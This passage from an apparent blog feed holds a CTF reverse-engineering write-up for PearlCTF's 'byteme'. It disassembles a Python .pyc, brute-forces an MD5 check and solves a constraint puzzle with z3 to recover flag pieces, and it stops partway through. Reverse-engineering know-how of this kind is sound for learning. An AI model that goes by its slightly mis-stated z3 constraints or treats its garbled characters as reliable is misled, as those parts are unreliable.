&#123;</span><br><span class="line">System.out.println(HELLO_WORLD);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>adb shell dumpsys activity top</p><p>adb shell am start -D -n åŒ…å&#x2F;.ui.login.LoginActivity</p><p>nkctf9233bg</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Androidé€†å‘&quot;&gt;&lt;a href=&quot;#Androidé€†å‘&quot; class=&quot;headerlink&quot; title=&quot;Androidé€†å‘&quot;&gt;&lt;/a&gt;Androidé€†å‘&lt;/h1&gt;&lt;h2 id=&quot;AndroidåŸºç¡€çŸ¥è¯†&quot;&gt;&lt;a href=&quot;#AndroidåŸºç¡€çŸ¥è¯†&quot; c</summary>
      
    
    
    
    
    <category term="RE Android" scheme="https://github.com/xyy9233/xyy9233.github.io.git/tags/RE-Android/"/>
    
  </entry>
  
  <entry>
    <title>PearlCTF</title>
    <link href="https://github.com/xyy9233/xyy9233.github.io.git/2024/03/15/PearlCTF/"/>
    <id>https://github.com/xyy9233/xyy9233.github.io.git/2024/03/15/PearlCTF/</id>
    <published>2024-03-14T16:00:00.000Z</published>
    <updated>2024-09-16T07:13:10.521Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PearlCTF"><a href="#PearlCTF" class="headerlink" title="PearlCTF"></a>PearlCTF</h1><h2 id="Rev"><a href="#Rev" class="headerlink" title="Rev"></a>Rev</h2><h3 id="byteme"><a href="#byteme" class="headerlink" title="byteme"></a>byteme</h3><blockquote><p>I know you are a python expert, but can you reverse this?</p><p>Author: TheAlpha</p><p><a href="https://github.com/D13David/ctf-writeups/blob/main/pearlctf24/rev/byteme/byteme.pyc"><code>byteme.pyc</code></a></p></blockquote><p>Tags: <em>rev</em></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> marshal, dis</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;byteme.pyc&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.seek(<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(dis.dis(marshal.load(file)))</span><br></pre></td></tr></table></figure><p>This challange comes with a compiled python script. There are nice <a href="https://github.com/zrax/pycdc"><code>decompilers</code></a> for this, but they are mostly lacking support for really new python  versions. So, not surprising, the decompiler doesnâ€™t want to work.</p><p>From the hexdump, we can see that the magic number (first four bytes are <code>0a0d0df0</code>). We can <a href="https://github.com/python/cpython/blob/5b2f21faf388d8de5b388996cfd4f03430085764/Lib/importlib/_bootstrap_external.py#L467C21-L467C25"><code>see</code></a> that this is corresponding to <code>Python 3.13a1 3568</code>. So lets grab the correct python version.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">00000000  f0 0d 0d 0a 00 00 00 00  47 16 e8 65 42 25 00 00  |........G..eB%..|</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import marshal, dis</span><br><span class="line"></span><br><span class="line">with open(&quot;byteme.pyc&quot;, &quot;rb&quot;) as file:</span><br><span class="line">    file.seek(16)</span><br><span class="line">    print(dis.dis(marshal.load(file)))</span><br></pre></td></tr></table></figure><p>Running this (with python 3.13), gives us a somewhat lenghty <a href="https://github.com/D13David/ctf-writeups/blob/main/pearlctf24/rev/byteme/decomp.asm"><code>result</code></a>. We can reverse this by hand (or we can adapt <code>pycdc</code> to support the new bytecodes). Either way, we find there are three  functions that are called and every one of them gives us one part of the flag. Lets start at the top.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line">  0           0 RESUME                   0</span><br><span class="line"></span><br><span class="line">             # from hashlib import md5</span><br><span class="line">  1           2 LOAD_CONST               0 (0)</span><br><span class="line">              4 LOAD_CONST               1 ((&#x27;md5&#x27;,))</span><br><span class="line">              6 IMPORT_NAME              0 (hashlib)</span><br><span class="line">              8 IMPORT_FROM              1 (md5)</span><br><span class="line">             10 STORE_NAME               1 (md5)</span><br><span class="line">             12 POP_TOP</span><br><span class="line"></span><br><span class="line">             # import time</span><br><span class="line">  2          14 LOAD_CONST               0 (0)</span><br><span class="line">             16 LOAD_CONST               2 (None)</span><br><span class="line">             18 IMPORT_NAME              2 (time)</span><br><span class="line">             20 STORE_NAME               2 (time)</span><br><span class="line"></span><br><span class="line">             # make function for &quot;crackme&quot;</span><br><span class="line">  4          22 LOAD_CONST               3 (&lt;code object crackme at 0x558a3158ccd0, file &quot;byteme.py&quot;, line 4&gt;)</span><br><span class="line">             24 MAKE_FUNCTION</span><br><span class="line">             26 STORE_NAME               3 (crackme)</span><br><span class="line"></span><br><span class="line">             # make function for &quot;solveme&quot;</span><br><span class="line"> 55          28 LOAD_CONST               4 (&lt;code object solveme at 0x558a315b3210, file &quot;byteme.py&quot;, line 55&gt;)</span><br><span class="line">             30 MAKE_FUNCTION</span><br><span class="line">             32 STORE_NAME               4 (solveme)</span><br><span class="line"></span><br><span class="line">             # make function for &quot;breakme&quot;</span><br><span class="line">142          34 LOAD_CONST               5 (&lt;code object breakme at 0x558a31538040, file &quot;byteme.py&quot;, line 142&gt;)</span><br><span class="line">             36 MAKE_FUNCTION</span><br><span class="line">             38 STORE_NAME               5 (breakme)</span><br><span class="line"></span><br><span class="line">             # if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">245          40 LOAD_NAME                6 (__name__)</span><br><span class="line">             42 LOAD_CONST               6 (&#x27;__main__&#x27;)</span><br><span class="line">             44 COMPARE_OP              88 (bool(==))</span><br><span class="line">             48 POP_JUMP_IF_FALSE       97 (to 246)</span><br><span class="line"></span><br><span class="line">             # spell = crackme()</span><br><span class="line">246          52 LOAD_NAME                3 (crackme)</span><br><span class="line">             54 PUSH_NULL</span><br><span class="line">             56 CALL                     0</span><br><span class="line">             64 STORE_NAME               7 (spell)</span><br><span class="line"></span><br><span class="line">             # answer = solveme()</span><br><span class="line">247          66 LOAD_NAME                4 (solveme)</span><br><span class="line">             68 PUSH_NULL</span><br><span class="line">             70 CALL                     0</span><br><span class="line">             78 STORE_NAME               8 (answer)</span><br><span class="line"></span><br><span class="line">             # chain = breakme()</span><br><span class="line">248          80 LOAD_NAME                5 (breakme)</span><br><span class="line">             82 PUSH_NULL</span><br><span class="line">             84 CALL                     0</span><br><span class="line">             92 STORE_NAME               9 (chain)</span><br><span class="line"></span><br><span class="line">             # print(&#x27;Thalor has risen!&#x27;)</span><br><span class="line">250          94 LOAD_NAME               10 (print)</span><br><span class="line">             96 PUSH_NULL</span><br><span class="line">             98 LOAD_CONST               7 (&#x27;Thalor has risen!&#x27;)</span><br><span class="line">            100 CALL                     1</span><br><span class="line">            108 POP_TOP</span><br><span class="line"></span><br><span class="line">            # print(&#x27;The prophecy has been fulfilled&#x27;)</span><br><span class="line">251         110 LOAD_NAME               10 (print)</span><br><span class="line">            112 PUSH_NULL</span><br><span class="line">            114 LOAD_CONST               8 (&#x27;The prophecy has been fulfilled&#x27;)</span><br><span class="line">            116 CALL                     1</span><br><span class="line">            124 POP_TOP</span><br><span class="line"></span><br><span class="line">            # print()</span><br><span class="line">252         126 LOAD_NAME               10 (print)</span><br><span class="line">            128 PUSH_NULL</span><br><span class="line">            130 CALL                     0</span><br><span class="line">            138 POP_TOP</span><br><span class="line"></span><br><span class="line">            # print(&#x27;#######################################&#x27;)</span><br><span class="line">253         140 LOAD_NAME               10 (print)</span><br><span class="line">            142 PUSH_NULL</span><br><span class="line">            144 LOAD_CONST               9 (&#x27;#######################################&#x27;)</span><br><span class="line">            146 CALL                     1</span><br><span class="line">            154 POP_TOP</span><br><span class="line"></span><br><span class="line">            # print(&#x27;##                                 ##&#x27;)</span><br><span class="line">254         156 LOAD_NAME               10 (print)</span><br><span class="line">            158 PUSH_NULL</span><br><span class="line">            160 LOAD_CONST              10 (&#x27;##&#x27;)</span><br><span class="line">            162 LOAD_CONST              11 (&#x27;                                 &#x27;)</span><br><span class="line">            164 LOAD_CONST              10 (&#x27;##&#x27;)</span><br><span class="line">            166 CALL                     3</span><br><span class="line">            174 POP_TOP</span><br><span class="line"></span><br><span class="line">            # print(f&#x27;## &#123;spell&#125;&#123;answer&#125;&#123;chain&#125; ##&#x27;)</span><br><span class="line">255         176 LOAD_NAME               10 (print)</span><br><span class="line">            178 PUSH_NULL</span><br><span class="line">            180 LOAD_CONST              10 (&#x27;##&#x27;)</span><br><span class="line">            182 LOAD_NAME                7 (spell)</span><br><span class="line">            184 FORMAT_SIMPLE</span><br><span class="line">            186 LOAD_NAME                8 (answer)</span><br><span class="line">            188 FORMAT_SIMPLE</span><br><span class="line">            190 LOAD_NAME                9 (chain)</span><br><span class="line">            192 FORMAT_SIMPLE</span><br><span class="line">            194 BUILD_STRING             3</span><br><span class="line">            196 LOAD_CONST              10 (&#x27;##&#x27;)</span><br><span class="line">            198 CALL                     3</span><br><span class="line">            206 POP_TOP</span><br><span class="line"></span><br><span class="line">            # print(&#x27;##                                 ##&#x27;)</span><br><span class="line">256         208 LOAD_NAME               10 (print)</span><br><span class="line">            210 PUSH_NULL</span><br><span class="line">            212 LOAD_CONST              10 (&#x27;##&#x27;)</span><br><span class="line">            214 LOAD_CONST              11 (&#x27;                                 &#x27;)</span><br><span class="line">            216 LOAD_CONST              10 (&#x27;##&#x27;)</span><br><span class="line">            218 CALL                     3</span><br><span class="line">            226 POP_TOP</span><br><span class="line"></span><br><span class="line">            # print(&#x27;#######################################&#x27;)</span><br><span class="line">257         228 LOAD_NAME               10 (print)</span><br><span class="line">            230 PUSH_NULL</span><br><span class="line">            232 LOAD_CONST               9 (&#x27;#######################################&#x27;)</span><br><span class="line">            234 CALL                     1</span><br><span class="line">            242 POP_TOP</span><br><span class="line">            244 RETURN_CONST             2 (None)</span><br><span class="line"></span><br><span class="line">245     &gt;&gt;  246 RETURN_CONST             2 (None)</span><br></pre></td></tr></table></figure><p>â€‹    </p><p>Or in vanilla python:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from hashlib import md5</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def crackme():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def solveme():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def breakme():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    spell = crackme()</span><br><span class="line">    answer = solveme()</span><br><span class="line">    chain = breakme()</span><br><span class="line"></span><br><span class="line">    print(&#x27;Thalor has risen!&#x27;)</span><br><span class="line">    print(&#x27;The prophecy has been fulfilled&#x27;)</span><br><span class="line">    print()</span><br><span class="line">    print(&#x27;#######################################&#x27;)</span><br><span class="line">    print(&#x27;##                                   ##&#x27;)</span><br><span class="line">    print(f&#x27;## &#123;spell&#125;&#123;answer&#125;&#123;chain&#125; ##&#x27;)</span><br><span class="line">    print(&#x27;##                                   ##&#x27;)</span><br><span class="line">    print(&#x27;#######################################&#x27;)</span><br></pre></td></tr></table></figure><p>â€‹    </p><p>Next on <code>crackme</code>. Doing the transformation of disassembly to python code by hand, gives us the following:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">def crackme():</span><br><span class="line">    print(&quot;                           o                    \n                       _---|         _ _ _ _ _ \n                    o   ---|     o   ]-I-I-I-[ \n   _ _ _ _ _ _  _---|      | _---|    \\ ` &#x27; / \n   ]-I-I-I-I-[   ---|      |  ---|    |.   | \n    \\ `   &#x27;_/       |     / \\    |    | /^\\| \n     [*]  __|       ^    / ^ \\   ^    | |*|| \n     |__   ,|      / \\  /    `\\ / \\   | ===| \n  ___| ___ ,|__   /    /=_=_=_=\\   \\  |,  _|\n  I_I__I_I__I_I  (====(_________)___|_|____|____\n  \\-\\--|-|--/-/  |     I  [ ]__I I_I__|____I_I_| \n   |[]      &#x27;|   | []  |`__  . [  \\-\\--|-|--/-/  \n   |.   | |&#x27; |___|_____I___|___I___|---------| \n  / \\| []   .|_|-|_|-|-|_|-|_|-|_|-| []   [] | \n &lt;===&gt;  |   .|-=-=-=-=-=-=-=-=-=-=-|   |    / \\  \n ] []|`   [] ||.|.|.|.|.|.|.|.|.|.||-      &lt;===&gt; \n ] []| ` |   |/////////\\\\\\\\\\.||__.  | |[] [ \n &lt;===&gt;     &#x27; ||||| |   |   | ||||.||  []   &lt;===&gt;\n  \\T/  | |-- ||||| | O | O | ||||.|| . |&#x27;   \\T/ \n   |      . _||||| |   |   | ||||.|| |     | |\n../|&#x27; v . | .|||||/____|____\\|||| /|. . | . ./\n.|//\\............/...........\\........../../\\\n&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    print(&quot;Welcome Warrior! You have made it till here&quot;)</span><br><span class="line">    print(&quot;This is where best of the best have fallen prey to the fate&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    print(&quot;It is written that only the true Thalor can get The sword of Eldoria&quot;)</span><br><span class="line">    print(&quot;Do you have what it takes to be Thalor?&quot;)</span><br><span class="line">    print(&quot;Prove your mettle by bringing the sword out of the castle&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    print(&quot;Go on! unlock the castle with XEKLEIDOMA spell&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    spell = input(&quot;&gt; &quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    if len(spell.strip()) != 12 or md5(spell.strip().encode()).hexdigest() != &quot;9ce86143889d80b01586f8a819d20f0c&quot;:</span><br><span class="line">        print(&quot;You are not THE ONE&quot;)</span><br><span class="line">        print(&quot;True Thalor is a master of sorcery&quot;)</span><br><span class="line">        print(&quot;Ground beneath you opens up and you fall into the depths of hell&quot;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    print(&quot;The door is opened!&quot;)</span><br><span class="line">    print(&quot;You surely mastered sorcery&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    time.sleep(3)</span><br><span class="line"></span><br><span class="line">    return spell</span><br></pre></td></tr></table></figure><p>â€‹    </p><p>So we need to find a input with length of  12 characters and with the matching hashsum. Since we can assume that we need to pass in the flag, we know the first 6 characters already due to the flag format: <code>pearl&#123;</code>. The remaining 6 characters we can bruteforce:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import hashlib</span><br><span class="line">import itertools</span><br><span class="line"></span><br><span class="line">def generate_permutations():</span><br><span class="line">    characters = &#x27;abcdefghijklmnopqrstuvwxyz0123456789_&#x27;</span><br><span class="line">    permutations = itertools.product(characters, repeat=6)</span><br><span class="line">    return (&#x27;&#x27;.join(p) for p in permutations)</span><br><span class="line"></span><br><span class="line">def calculate_md5(text):</span><br><span class="line">    return hashlib.md5(text.encode()).hexdigest()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    for permutation in generate_permutations():</span><br><span class="line">        md5_hash = calculate_md5(&quot;pearl&#123;&quot; + permutation)</span><br><span class="line">        if md5_hash in &quot;9ce86143889d80b01586f8a819d20f0c&quot;:</span><br><span class="line">            print(permutation)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure><p>â€‹    </p><p>Running this, gives us the magic spell <code>pearl&#123;e4sy_p</code>. The second function is <code>solveme</code> and the reconstructed code looks like the following:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">def solveme():</span><br><span class="line">    print(&quot;\n                                            .&quot;&quot;--..__\n                     _                     []       ``-.._\n                  .\&#x27;` `\&#x27;.                  ||__           `-._\n</span><br><span class="line">  /    ,-.\\                 ||_ ```---..__     `-.\n                /    /:::\\               /|//&#125;          ``--._  `.\n                |    |:::||              |////&#125;                `. |\n                |    |:::||             //\&#x27;///                   -\n                |    |:::||            //  ||\&#x27;     \n                /    |:::|/        _,-//\\  ||\n               /`    |:::|`-,__,-\&#x27;`  |/  \\ ||\n             /`  |   |\&#x27;\&#x27; ||           \\   |||\n           /`    \\   |   ||            |  /||\n         |`       |  |   |)            \\ | ||\n        |          \\ |   /      ,.__    \\| ||\n        /           `         /`    `\\   | ||\n       |                     /        \\  / ||\n       |                     |        | /  ||\n       /         /           |        `(   ||\n      /          .           /</span><br><span class="line">)  ||\n     |            \\          |     ________||\n    /             |          /     `-------.|\n   |\\            /          |              ||\n   \\/`-._       |           /              ||\n    //   `.    /`           |              ||\n   //`.    `. |             \\              ||\n  ///\\ `-._  )/             |              ||\n //// )   .(/               |              ||\n ||||   ,\&#x27;` )               /              //\n ||||  /                    /             || \n `\\` /`                    |             // \n     |`                     \\            ||  \n    /                        |           //  \n  /`                          \\         //   \n/`                            |        ||    \n`-.___,-.      .-.        ___,\&#x27;        (/    \n         `---\&#x27;`   `\&#x27;----\&#x27;`\n&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    print(&quot;As you walk in, you see a spectral figure Elyrian, the Guardian of Souls&quot;)</span><br><span class="line">    print(&quot;He speaks to you in a voice that echoes through the chamber&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    print(&#x27;&quot;Brave warrior, before you lies the next trial on your path. Answer my riddle, and prove your worthiness to continue your quest.&quot;&#x27;)</span><br><span class="line">    print(&#x27;\n&quot;I am a word of ten, with numbers and letters blend,\nUnravel me, and secrets I\&#x27;ll send.\nThough cryptic in sight, I hold the code tight,\nUnlock my mystery with wit and might.&quot;\n&#x27;)</span><br><span class="line"></span><br><span class="line">    answer = input(&quot;&gt; &quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    answer = list(map(ord, list(answer.strip())))</span><br><span class="line"></span><br><span class="line">    try:</span><br><span class="line">        assert(len(answer) == 10)</span><br><span class="line">        assert(answer[6] + answer[7] + answer[8] - answer[5] == 190)</span><br><span class="line">        assert(answer[6] + answer[5] + answer[5] - answer[2] == 202)</span><br><span class="line">        assert(answer[9] + answer[3] + answer[2] + answer[5] == 433)</span><br><span class="line">        assert(answer[7] + answer[0] - answer[0] + answer[3] == 237)</span><br><span class="line">        assert(answer[1] - answer[9] - answer[5] + answer[4] == -50)</span><br><span class="line">        assert(answer[2] - answer[3] + answer[1] - answer[1] == -6)</span><br><span class="line">        assert(answer[8] - answer[7] - answer[6] + answer[5] == -88)</span><br><span class="line">        assert(answer[0] + answer[8] - answer[5] - answer[3] == -117)</span><br><span class="line">        assert(answer[5] + answer[6] + answer[8] + answer[2] == 385)</span><br><span class="line">        assert(answer[5] - answer[4] - answer[5] + answer[9] == 4)</span><br><span class="line">        assert(answer[2] - answer[9] + answer[5] - answer[0] == 63)</span><br><span class="line">        assert(answer[2] - answer[5] + answer[4] - answer[9] == 13)</span><br><span class="line">        assert(answer[8] + answer[3] + answer[7] - answer[6] == 167)</span><br><span class="line">        assert(answer[6] - answer[5] - answer[0] - answer[5] == -126)</span><br><span class="line">        assert(answer[2] - answer[5] - answer[6] - answer[4] == -199)</span><br><span class="line">    except AssertionError:</span><br><span class="line">        print(&quot;You are not worthy&quot;)</span><br><span class="line">        print(&quot;Your soul has been cursed&quot;)</span><br><span class="line">        print(&quot;You will seek your own death in a fortnight&quot;)</span><br><span class="line">        exit()</span><br><span class="line"></span><br><span class="line">    print(&quot;You have proven your `wit and might`&quot;)</span><br><span class="line">    print(&quot;Elyrian, the Guardian of Souls, bows to you&quot;)</span><br><span class="line">    print(&quot;You have unlocked the next chamber&quot;)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line">    time.sleep(4)</span><br><span class="line"></span><br><span class="line">    return &quot;&quot;.join([chr(x) for x in answer])</span><br></pre></td></tr></table></figure><p>â€‹    </p><p>This time, the user input needs to be 10  characters and we have a whole lot of constraints that need to be  fulfilled. Constraints call for <code>SAT</code>, so we use <code>z3</code> to get the answer.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from z3 import *</span><br><span class="line"></span><br><span class="line">answer = [Int(f&quot;answer&#123;i&#125;&quot;) for i in range(10)]</span><br><span class="line"></span><br><span class="line">solver = Solver()</span><br><span class="line"></span><br><span class="line">solver.add(answer[6] + answer[7] + answer[8] - answer[5] &gt;= 190)</span><br><span class="line">solver.add(answer[6] + answer[5] + answer[5] - answer[2] &gt;= 202)</span><br><span class="line">solver.add(answer[9] + answer[3] + answer[2] + answer[5] &gt;= 433)</span><br><span class="line">solver.add((answer[7] + answer[0] - answer[0]) + answer[3] &gt;= 237)</span><br><span class="line">solver.add((answer[1] - answer[9] - answer[5]) + answer[4] &gt;= -50)</span><br><span class="line">solver.add((answer[2] - answer[3]) + answer[1] - answer[1] &gt;= -6)</span><br><span class="line">solver.add((answer[8] - answer[7] - answer[6]) + answer[5] &gt;= -88)</span><br><span class="line">solver.add(answer[0] + answer[8] - answer[5] - answer[3] &gt;= -117)</span><br><span class="line">solver.add(answer[5] + answer[6] + answer[8] + answer[2] &gt;= 385)</span><br><span class="line">solver.add((answer[5] - answer[4] - answer[5]) + answer[9] &gt;= 4)</span><br><span class="line">solver.add((answer[2] - answer[9]) + answer[5] - answer[0] &gt;= 63)</span><br><span class="line">solver.add((answer[2] - answer[5]) + answer[4] - answer[9] &gt;= 13)</span><br><span class="line">solver.add(answer[8] + answer[3] + answer[7] - answer[6] &gt;= 167)</span><br><span class="line">solver.add(answer[6] - answer[5] - answer[0] - answer[5] &gt;= -126)</span><br><span class="line">solver.add(answer[2] - answer[5] - answer[6] - answer[4] &gt;= -199)</span><br><span class="line"></span><br><span class="line">if solver.check() == sat:</span><br><span class="line">    model = solver.model()</span><br><span class="line">    print(&quot;Solution found:&quot;)</span><br><span class="line">    for i in range(10):</span><br><span class="line">        print(f&quot;&#123;chr(model[answer[i]].as_long())&#125;&quot;, end=&quot;&quot;)</span><br><span class="line">else:</span><br><span class="line">    print(&quot;No solution found&quot;)</span><br></pre></td></tr></table></figure><p>â€‹    </p><p>Running this gives us the second part of the flag: <code>34sy_byt3c</code>. One part to goâ€¦ Moving on to <code>breakme</code>. The reconstructed code looks like this:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">def breakme():</span><br><span class="line">    sword = &quot;\n                      _..._\n                     /MMMMM\\\n                    (I8H#H8I)\n                    (I8H#H8I)\n                     \\WWWWW/\n                      